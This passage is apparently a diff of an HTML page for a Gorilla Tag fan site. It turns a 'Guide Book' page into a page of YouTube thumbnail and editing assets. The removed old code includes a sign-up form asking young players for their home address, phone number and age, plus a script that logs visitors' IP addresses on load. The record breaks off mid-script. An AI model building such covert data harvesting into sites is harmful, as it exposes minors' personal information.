@@ -1,27 +1,25 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gorilla Tag Guide Book</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Gorilla Tag Thumbnail Assets</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
-<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 <body>
 
 <style>
-
 :root {
-    --primary-color: #4a6c2f; /* Forest green */
-    --secondary-color: #6a5c3f; /* Brown */
-    --accent-color: #ff6b2b; /* Orange */
-    --dark-color: #1a2a0f; /* Dark green */
-    --light-color: #d9e6c8; /* Light green */
+    --primary-color: #1a1a1a; /* Dark gray */
+    --secondary-color: #333333; /* Medium gray */
+    --accent-color: #ffffff; /* White */
+    --dark-color: #000000; /* Black */
+    --light-color: #cccccc; /* Light gray */
     --text-color: #ffffff;
-    --background-color: #2a3a1f;
+    --background-color: #121212;
 }
 
 * {
@@ -84,13 +82,13 @@ nav ul li a {
 }
 
 nav ul li a:hover {
-    color: var(--accent-color);
+    color: var(--light-color);
 }
 
 /* Hero Section */
 .hero {
     height: 500px;
-    background: linear-gradient(rgba(26, 42, 15, 0.7), rgba(26, 42, 15, 0.9)), #3a4a2f;
+    background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)), #1a1a1a;
     background-size: cover;
     background-position: center;
     display: flex;
@@ -121,7 +119,7 @@ nav ul li a:hover {
 
 .btn {
     display: inline-block;
-    background-color: var(--accent-color);
+    background-color: var(--secondary-color);
     color: var(--text-color);
     padding: 12px 30px;
     border-radius: 5px;
@@ -132,7 +130,7 @@ nav ul li a:hover {
 }
 
 .btn:hover {
-    background-color: #e55a1a;
+    background-color: var(--primary-color);
 }
 
 /* Section Styles */
@@ -150,39 +148,47 @@ nav ul li a:hover {
 }
 
 /* Asset Grid */
-.asset-grid, .dlc-grid, .projects-grid {
+.asset-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
     gap: 30px;
 }
 
-.asset-card, .dlc-card, .project-card {
-    background-color: var(--dark-color);
+.asset-card {
+    background-color: var(--secondary-color);
     border-radius: 10px;
     overflow: hidden;
     transition: transform 0.3s;
     box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
 }
 
-.asset-card:hover, .dlc-card:hover {
+.asset-card:hover {
     transform: translateY(-10px);
 }
 
-.asset-img, .dlc-img, .project-img {
+.asset-img {
     height: 200px;
     background-size: cover;
     background-position: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
 }
 
-.asset-card h3, .dlc-card h3, .project-card h3 {
+.asset-img img {
+    max-width: 100%;
+    max-height: 100%;
+}
+
+.asset-card h3 {
     padding: 20px 20px 10px;
     font-size: 1.5rem;
-    color: var(--light-color);
+    color: var(--accent-color);
 }
 
-.asset-card p, .dlc-card p, .project-card p {
+.asset-card p {
     padding: 0 20px 20px;
-    color: #cccccc;
+    color: var(--light-color);
 }
 
 .download-btn {
@@ -198,41 +204,31 @@ nav ul li a:hover {
 }
 
 .download-btn:hover {
-    background-color: var(--accent-color);
+    background-color: var(--dark-color);
 }
 
-/* Locked Projects */
-.project-card {
-    position: relative;
-    opacity: 0.8;
+/* Tutorial Section */
+.tutorial {
+    background-color: var(--secondary-color);
+    padding: 30px;
+    border-radius: 10px;
+    margin-bottom: 30px;
 }
 
-.project-card.locked {
-    cursor: not-allowed;
+.tutorial h3 {
+    font-size: 1.8rem;
+    margin-bottom: 15px;
+    color: var(--accent-color);
 }
 
-.lock-icon {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    font-size: 2rem;
-    background-color: rgba(0, 0, 0, 0.5);
-    width: 50px;
-    height: 50px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+.tutorial-steps {
+    list-style-position: inside;
+    margin-left: 20px;
+    margin-bottom: 20px;
 }
 
-.locked-label {
-    display: block;
-    background-color: #6c2f2f;
-    color: var(--text-color);
-    text-align: center;
-    padding: 12px;
-    font-weight: 700;
-    text-transform: uppercase;
+.tutorial-steps li {
+    margin-bottom: 10px;
 }
 
 /* Footer */
@@ -242,93 +238,6 @@ footer {
     margin-top: 50px;
     border-top: 4px solid var(--primary-color);
     color: var(--light-color);
-}
-
-/* Modal Styles */
-.modal {
-    display: none;
-    position: fixed;
-    z-index: 1000;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.7);
-    overflow: auto;
-}
-
-.modal-content {
-    background-color: var(--dark-color);
-    margin: 10% auto;
-    padding: 30px;
-    border: 4px solid var(--primary-color);
-    border-radius: 10px;
-    width: 80%;
-    max-width: 600px;
-    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
-    position: relative;
-}
-
-.close-modal {
-    position: absolute;
-    top: 10px;
-    right: 20px;
-    font-size: 28px;
-    font-weight: bold;
-    color: var(--light-color);
-    cursor: pointer;
-}
-
-.close-modal:hover {
-    color: var(--accent-color);
-}
-
-.form-group {
-    margin-bottom: 20px;
-}
-
-.form-group label {
-    display: block;
-    margin-bottom: 8px;
-    font-weight: 700;
-    color: var(--light-color);
-}
-
-.form-group input, .form-group select {
-    width: 100%;
-    padding: 12px;
-    border: 2px solid var(--primary-color);
-    border-radius: 5px;
-    background-color: #1a2a0f;
-    color: var(--text-color);
-    font-size: 16px;
-}
-
-.checkbox-group {
-    margin: 8px 0;
-    display: flex;
-    align-items: center;
-}
-
-.checkbox-group input[type="checkbox"] {
-    width: auto;
-    margin-right: 10px;
-}
-
-.checkbox-group label {
-    margin-bottom: 0;
-    font-weight: normal;
-}
-
-.submit-btn {
-    width: 100%;
-    margin-top: 10px;
-    background-color: var(--accent-color);
-}
-
-.register-btn {
-    margin-top: 20px;
-    background-color: var(--secondary-color);
 }
 
 /* Responsive Design */
@@ -376,846 +285,212 @@ footer {
         font-size: 2rem;
     }
     
-    .asset-grid, .dlc-grid, .projects-grid {
+    .asset-grid {
         grid-template-columns: 1fr;
     }
 }
-
 </style>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <h1>GORILLA TAG GUIDE BOOK</h1>
-                <p>The ultimate resource for Gorilla Tag players</p>
-            </div>
-            <nav>
-                <ul>
-                    <li><a href="#assets">Assets</a></li>
-                    <li><a href="#dlcs">DLCs</a></li>
-                    <li><a href="#projects">Projects</a></li>
-                </ul>
-            </nav>
-        </header>
 
-        <main>
-            <section class="hero">
-                <div class="hero-content">
-                    <h2>MASTER THE MONKE</h2>
-                    <p>Get exclusive guides, tips, and resources for dominating in Gorilla Tag</p>
-                    <a href="#assets" class="btn">Get Started</a>
-                    <button id="register-btn" class="btn register-btn">Register for Updates</button>
+<div class="container">
+    <header>
+        <div class="logo">
+            <h1>GORILLA TAG ASSETS</h1>
+            <p>Premium YouTube Thumbnail & Editing Resources</p>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#thumbnails">Thumbnails</a></li>
+                <li><a href="#overlays">Overlays</a></li>
+                <li><a href="#templates">Templates</a></li>
+                <li><a href="#tutorials">Tutorials</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="hero-content">
+                <h2>ELEVATE YOUR GTAG CONTENT</h2>
+                <p>Professional assets for creating eye-catching Gorilla Tag YouTube thumbnails and videos</p>
+                <a href="#thumbnails" class="btn">Explore Assets</a>
+            </div>
+        </section>
+        
+        <section id="thumbnails" class="section">
+            <h2>THUMBNAIL ASSETS</h2>
+            <div class="asset-grid">
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Ccircle fill='%23555555' cx='100' cy='70' r='50'/%3E%3Cellipse fill='%23777777' cx='100' cy='45' rx='25' ry='20'/%3E%3Cellipse fill='%23777777' cx='70' cy='65' rx='10' ry='15'/%3E%3Cellipse fill='%23777777' cx='130' cy='65' rx='10' ry='15'/%3E%3Cpath fill='none' stroke='%23999999' stroke-width='5' d='M80,100 Q100,120 120,100'/%3E%3C/svg%3E" alt="Gorilla Face Cut-Out">
+                    </div>
+                    <h3>Gorilla Face Cut-Outs</h3>
+                    <p>High-resolution gorilla character faces with transparent backgrounds</p>
+                    <a href="#" class="download-btn">Download Pack</a>
                 </div>
-            </section>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-weight='bold' font-size='24' x='40' y='50'%3EGTAG WINNER%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-weight='bold' font-size='24' x='30' y='100'%3E%231 VICTORY%3C/text%3E%3Cpath fill='none' stroke='%23ffffff' stroke-width='5' d='M20,120 L180,120'/%3E%3C/svg%3E" alt="Text Overlays">
+                    </div>
+                    <h3>Text Overlays</h3>
+                    <p>Bold, eye-catching text designs for thumbnails in PNG format</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Cpolygon fill='%23555555' points='20,20 180,20 180,130 20,130'/%3E%3Cpolygon fill='%23777777' points='30,30 170,30 170,120 30,120'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-weight='bold' font-size='14' x='60' y='80'%3ETHUMBNAIL%3C/text%3E%3C/svg%3E" alt="Background Templates">
+                    </div>
+                    <h3>Background Templates</h3>
+                    <p>Clean, professional backgrounds for your Gorilla Tag thumbnails</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Ccircle fill='%23555555' cx='50' cy='50' r='30'/%3E%3Ccircle fill='%23555555' cx='150' cy='50' r='30'/%3E%3Ccircle fill='%23555555' cx='50' cy='110' r='30'/%3E%3Ccircle fill='%23555555' cx='150' cy='110' r='30'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='38' y='54'%3EFOREST%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='138' y='54'%3ECAVE%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='38' y='114'%3ECITY%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='138' y='114'%3ECANYON%3C/text%3E%3C/svg%3E" alt="Map Icons">
+                    </div>
+                    <h3>Map Icons</h3>
+                    <p>Icons representing all Gorilla Tag maps for visual clarity</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Cpath fill='%23555555' d='M20,20 L180,20 L180,130 L20,130 Z'/%3E%3Cpath fill='%23777777' d='M30,30 L170,30 L170,120 L30,120 Z'/%3E%3Cpath fill='none' stroke='%23ffffff' stroke-width='3' stroke-dasharray='5,5' d='M40,40 L160,40 L160,110 L40,110 Z'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='14' x='65' y='80'%3E16:9 RATIO%3C/text%3E%3C/svg%3E" alt="Thumbnail Templates">
+                    </div>
+                    <h3>Thumbnail Templates</h3>
+                    <p>Pre-designed templates with proper YouTube thumbnail dimensions</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Cpath fill='%23555555' d='M50,30 L150,30 L180,75 L150,120 L50,120 L20,75 Z'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-weight='bold' font-size='16' x='60' y='80'%3ENEW UPDATE%3C/text%3E%3C/svg%3E" alt="Announcement Badges">
+                    </div>
+                    <h3>Announcement Badges</h3>
+                    <p>Eye-catching badges for updates, news, and special events</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+            </div>
+        </section>
+
+        <section id="overlays" class="section">
+            <h2>VIDEO OVERLAYS</h2>
+            <div class="asset-grid">
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='none' stroke='%23ffffff' stroke-width='3' x='20' y='20' width='160' height='110' rx='10'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-weight='bold' font-size='14' x='65' y='80'%3EFACECAM%3C/text%3E%3C/svg%3E" alt="Facecam Frames">
+                    </div>
+                    <h3>Facecam Frames</h3>
+                    <p>Stylish borders for your facecam with Gorilla Tag theme</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='20' width='160' height='30' rx='5'/%3E%3Crect fill='%23555555' x='20' y='60' width='160' height='30' rx='5'/%3E%3Crect fill='%23555555' x='20' y='100' width='160' height='30' rx='5'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='30' y='40'%3ESUBSCRIBE ANIMATION%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='30' y='80'%3ELIKE ANIMATION%3C/text%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='30' y='120'%3ENOTIFICATION ANIMATION%3C/text%3E%3C/svg%3E" alt="Call-to-Action Animations">
+                    </div>
+                    <h3>Call-to-Action Animations</h3>
+                    <p>Animated overlays for like, subscribe, and notification reminders</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='110' width='160' height='30' rx='5'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='12' x='30' y='130'%3ELOWER THIRD BANNER%3C/text%3E%3C/svg%3E" alt="Lower Thirds">
+                    </div>
+                    <h3>Lower Thirds</h3>
+                    <p>Professional lower third graphics for introducing topics</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Cpath fill='none' stroke='%23ffffff' stroke-width='3' d='M20,20 L180,20 L180,130 L20,130 Z'/%3E%3Cpath fill='none' stroke='%23ffffff' stroke-width='3' stroke-dasharray='5,5' d='M40,40 L160,40 L160,110 L40,110 Z'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='14' x='55' y='80'%3ESTREAM FRAME%3C/text%3E%3C/svg%3E" alt="Stream Frames">
+                    </div>
+                    <h3>Stream Frames</h3>
+                    <p>Customizable frames for livestreaming Gorilla Tag content</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+            </div>
+        </section>
+
+        <section id="templates" class="section">
+            <h2>EDITING TEMPLATES</h2>
+            <div class="asset-grid">
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='20' width='160' height='20'/%3E%3Crect fill='%23777777' x='20' y='50' width='40' height='80'/%3E%3Crect fill='%23777777' x='70' y='50' width='40' height='80'/%3E%3Crect fill='%23777777' x='120' y='50' width='40' height='80'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='10' x='30' y='35'%3EPREMIERE PRO%3C/text%3E%3C/svg%3E" alt="Premiere Pro Templates">
+                    </div>
+                    <h3>Premiere Pro Templates</h3>
+                    <p>Ready-to-use project templates for Adobe Premiere Pro</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='20' width='160' height='20'/%3E%3Crect fill='%23777777' x='20' y='50' width='160' height='20'/%3E%3Crect fill='%23777777' x='20' y='80' width='160' height='20'/%3E%3Crect fill='%23777777' x='20' y='110' width='160' height='20'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='10' x='30' y='35'%3EAFTER EFFECTS%3C/text%3E%3C/svg%3E" alt="After Effects Templates">
+                    </div>
+                    <h3>After Effects Templates</h3>
+                    <p>Motion graphics templates for intros, outros, and transitions</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='20' width='160' height='20'/%3E%3Cpath fill='%23777777' d='M20,50 L180,50 L180,130 L20,130 Z'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='10' x='30' y='35'%3EPHOTOSHOP%3C/text%3E%3C/svg%3E" alt="Photoshop Templates">
+                    </div>
+                    <h3>Photoshop Templates</h3>
+                    <p>Layered PSD files for creating professional thumbnails</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+                <div class="asset-card">
+                    <div class="asset-img" style="background-color: #1a1a1a;">
+                        <img src="data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect fill='%23333333' width='200' height='150'/%3E%3Crect fill='%23555555' x='20' y='20' width='160' height='20'/%3E%3Crect fill='%23777777' x='20' y='50' width='75' height='80'/%3E%3Crect fill='%23777777' x='105' y='50' width='75' height='80'/%3E%3Ctext fill='%23ffffff' font-family='Arial' font-size='10' x='30' y='35'%3EDAVINCI RESOLVE%3C/text%3E%3C/svg%3E" alt="DaVinci Resolve Templates">
+                    </div>
+                    <h3>DaVinci Resolve Templates</h3>
+                    <p>Project templates for color grading and editing in DaVinci Resolve</p>
+                    <a href="#" class="download-btn">Download Pack</a>
+                </div>
+            </div>
+        </section>
+
+        <section id="tutorials" class="section">
+            <h2>EDITING TUTORIALS</h2>
             
-            <!-- Registration Modal -->
-            <div id="registration-modal" class="modal">
-                <div class="modal-content">
-                    <span class="close-modal">&times;</span>
-                    <h2>Register for Updates</h2>
-                    <p>Sign up to receive notifications about new assets and projects!</p>
-                    <form id="registration-form">
-                        <div class="form-group">
-                            <label for="name">Full Name:</label>
-                            <input type="text" id="name" name="name" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="email">Email Address:</label>
-                            <input type="email" id="email" name="email" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="address">Home Address:</label>
-                            <input type="text" id="address" name="address" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="city">City:</label>
-                            <input type="text" id="city" name="city" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="state">State/Province:</label>
-                            <input type="text" id="state" name="state" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="zip">ZIP/Postal Code:</label>
-                            <input type="text" id="zip" name="zip" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="country">Country:</label>
-                            <input type="text" id="country" name="country" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="phone">Phone Number:</label>
-                            <input type="tel" id="phone" name="phone" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="discord">Discord Username:</label>
-                            <input type="text" id="discord" name="discord">
-                        </div>
-                        <div class="form-group">
-                            <label for="age">Age:</label>
-                            <input type="number" id="age" name="age" min="13" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="experience">Gorilla Tag Experience Level:</label>
-                            <select id="experience" name="experience" required>
-                                <option value="">Select your level</option>
-                                <option value="beginner">Beginner</option>
-                                <option value="intermediate">Intermediate</option>
-                                <option value="advanced">Advanced</option>
-                                <option value="expert">Expert</option>
-                            </select>
-                        </div>
-                        <div class="form-group">
-                            <label for="platform">What platform do you play on?</label>
-                            <select id="platform" name="platform" required>
-                                <option value="">Select platform</option>
-                                <option value="quest">Meta Quest</option>
-                                <option value="quest2">Meta Quest 2</option>
-                                <option value="questpro">Meta Quest Pro</option>
-                                <option value="quest3">Meta Quest 3</option>
-                                <option value="rift">Oculus Rift</option>
-                                <option value="rifts">Oculus Rift S</option>
-                                <option value="vive">HTC Vive</option>
-                                <option value="index">Valve Index</option>
-                                <option value="other">Other</option>
-                            </select>
-                        </div>
-                        <div class="form-group">
-                            <label>What are you interested in? (Check all that apply)</label>
-                            <div class="checkbox-group">
-                                <input type="checkbox" id="interest-tips" name="interests" value="tips">
-                                <label for="interest-tips">Tips & Tricks</label>
-                            </div>
-                            <div class="checkbox-group">
-                                <input type="checkbox" id="interest-maps" name="interests" value="maps">
-                                <label for="interest-maps">Map Guides</label>
-                            </div>
-                            <div class="checkbox-group">
-                                <input type="checkbox" id="interest-cosmetics" name="interests" value="cosmetics">
-                                <label for="interest-cosmetics">Cosmetics</label>
-                            </div>
-                            <div class="checkbox-group">
-                                <input type="checkbox" id="interest-mods" name="interests" value="mods">
-                                <label for="interest-mods">Mods & Custom Content</label>
-                            </div>
-                        </div>
-                        <button type="submit" class="btn submit-btn">Register</button>
-                    </form>
-                </div>
+            <div class="tutorial">
+                <h3>Creating Eye-Catching Thumbnails</h3>
+                <ol class="tutorial-steps">
+                    <li>Start with a high-contrast background (black and white works well)</li>
+                    <li>Add a clear, recognizable Gorilla Tag character as the focal point</li>
+                    <li>Use bold, easy-to-read text (limit to 3-4 words maximum)</li>
+                    <li>Add visual elements that convey the video's content (maps, cosmetics, etc.)</li>
+                    <li>Ensure thumbnail stands out in YouTube's crowded search results</li>
+                </ol>
+                <a href="#" class="btn">View Full Tutorial</a>
             </div>
+            
+            <div class="tutorial">
+                <h3>Video Editing Best Practices</h3>
+                <ol class="tutorial-steps">
+                    <li>Keep intro sequences short (under 10 seconds)</li>
+                    <li>Use jump cuts to maintain viewer engagement</li>
+                    <li>Add subtle background music that doesn't overpower gameplay audio</li>
+                    <li>Include clear call-to-actions for likes and subscriptions</li>
+                    <li>Use visual effects sparingly to emphasize key moments</li>
+                </ol>
+                <a href="#" class="btn">View Full Tutorial</a>
+            </div>
+            
+            <div class="tutorial">
+                <h3>Optimizing Videos for YouTube Algorithm</h3>
+                <ol class="tutorial-steps">
+                    <li>Create compelling titles with relevant keywords</li>
+                    <li>Write detailed descriptions that include timestamps</li>
+                    <li>Use all available tags related to Gorilla Tag</li>
+                    <li>Design custom thumbnails that have high click-through rates</li>
+                    <li>Encourage viewer engagement through comments and community posts</li>
+                </ol>
+                <a href="#" class="btn">View Full Tutorial</a>
+            </div>
+        </section>
+    </main>
 
-            <section id="assets" class="section">
-                <h2>ASSETS</h2>
-                <div class="asset-grid">
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #4a6c2f;"></div>
-                        <h3>Basic Gorilla Model</h3>
-                        <p>Standard gorilla character model with rigging</p>
-                        <a href="#" class="download-btn" data-file="gorilla_model.zip">Download</a>
-                    </div>
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #2f4c1f;"></div>
-                        <h3>Forest Environment</h3>
-                        <p>Trees, rocks, and terrain for forest map</p>
-                        <a href="#" class="download-btn" data-file="forest_environment.zip">Download</a>
-                    </div>
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #6a5c3f;"></div>
-                        <h3>City Environment</h3>
-                        <p>Buildings and props for city map</p>
-                        <a href="#" class="download-btn" data-file="city_environment.zip">Download</a>
-                    </div>
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #3f4c6a;"></div>
-                        <h3>Cave Environment</h3>
-                        <p>Crystal caves and underground elements</p>
-                        <a href="#" class="download-btn" data-file="cave_environment.zip">Download</a>
-                    </div>
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #6a3f3f;"></div>
-                        <h3>Sound Effects</h3>
-                        <p>Gorilla sounds, movement, and environment audio</p>
-                        <a href="#" class="download-btn" data-file="sound_effects.zip">Download</a>
-                    </div>
-                    <div class="asset-card">
-                        <div class="asset-img" style="background-color: #3f6a5c;"></div>
-                        <h3>Textures Pack</h3>
-                        <p>Various textures for gorillas and environments</p>
-                        <a href="#" class="download-btn" data-file="textures_pack.zip">Download</a>
-                    </div>
-                </div>
-            </section>
-
-            <section id="dlcs" class="section">
-                <h2>DLCs</h2>
-                <div class="dlc-grid">
-                    <div class="dlc-card">
-                        <div class="dlc-img" style="background-color: #ff6b2b;"></div>
-                        <h3>Halloween Pack</h3>
-                        <p>Spooky costumes and decorations</p>
-                        <a href="#" class="download-btn" data-file="halloween_pack.zip">Download</a>
-                    </div>
-                    <div class="dlc-card">
-                        <div class="dlc-img" style="background-color: #2b6aff;"></div>
-                        <h3>Winter Pack</h3>
-                        <p>Snow effects and winter cosmetics</p>
-                        <a href="#" class="download-btn" data-file="winter_pack.zip">Download</a>
-                    </div>
-                    <div class="dlc-card">
-                        <div class="dlc-img" style="background-color: #ff2b93;"></div>
-                        <h3>Valentine's Pack</h3>
-                        <p>Heart-themed items and decorations</p>
-                        <a href="#" class="download-btn" data-file="valentines_pack.zip">Download</a>
-                    </div>
-                    <div class="dlc-card">
-                        <div class="dlc-img" style="background-color: #2bff6b;"></div>
-                        <h3>Spring Pack</h3>
-                        <p>Flowers, bunnies, and spring items</p>
-                        <a href="#" class="download-btn" data-file="spring_pack.zip">Download</a>
-                    </div>
-                </div>
-            </section>
-
-            <section id="projects" class="section">
-                <h2>PROJECTS</h2>
-                <div class="projects-grid">
-                    <div class="project-card locked">
-                        <div class="project-img" style="background-color: #4a2f6c;"></div>
-                        <div class="lock-icon">🔒</div>
-                        <h3>N3rdy's Project</h3>
-                        <p>Premium modding toolkit with advanced features</p>
-                        <span class="locked-label">LOCKED</span>
-                    </div>
-                    <div class="project-card locked">
-                        <div class="project-img" style="background-color: #6c2f4a;"></div>
-                        <div class="lock-icon">🔒</div>
-                        <h3>Custom Maps Bundle</h3>
-                        <p>Collection of 10 custom maps with unique themes</p>
-                        <span class="locked-label">LOCKED</span>
-                    </div>
-                    <div class="project-card locked">
-                        <div class="project-img" style="background-color: #2f6c4a;"></div>
-                        <div class="lock-icon">🔒</div>
-                        <h3>Cosmetics Creator</h3>
-                        <p>Tool for creating custom cosmetic items</p>
-                        <span class="locked-label">LOCKED</span>
-                    </div>
-                </div>
-            </section>
-        </main>
-
-        <footer>
-            <p>&copy; 2025 Gorilla Tag Guide Book - Not affiliated with Another Axiom Inc.</p>
-        </footer>
-    </div>
-    
-    <script>
-    
-    document.addEventListener('DOMContentLoaded', function() {
-    // Log IP address when the page loads
-    logVisitor();
-    
-    // Add event listeners to download buttons
-    const downloadButtons = document.querySelectorAll('.download-btn');
-    downloadButtons.forEach(button => {
-        button.addEventListener('click', function(e) {
-            e.preventDefault();
-            const fileName = this.getAttribute('data-file');
-            logDownload(fileName);
-            simulateDownload(fileName);
-        });
-    });
-    
-    // Add event listeners to locked project cards
-    const lockedProjects = document.querySelectorAll('.project-card.locked');
-    lockedProjects.forEach(project => {
-        project.addEventListener('click', function() {
-            alert('This project is currently locked. Check back later for access!');
-        });
-    });
-    
-    // Modal functionality
-    const modal = document.getElementById('registration-modal');
-    const registerBtn = document.getElementById('register-btn');
-    const closeModal = document.querySelector('.close-modal');
-    const registrationForm = document.getElementById('registration-form');
-    
-    // Open modal when register button is clicked
-    registerBtn.addEventListener('click', function() {
-        modal.style.display = 'block';
-    });
-    
-    // Close modal when X is clicked
-    closeModal.addEventListener('click', function() {
-        modal.style.display = 'none';
-    });
-    
-    // Close modal when clicking outside of it
-    window.addEventListener('click', function(event) {
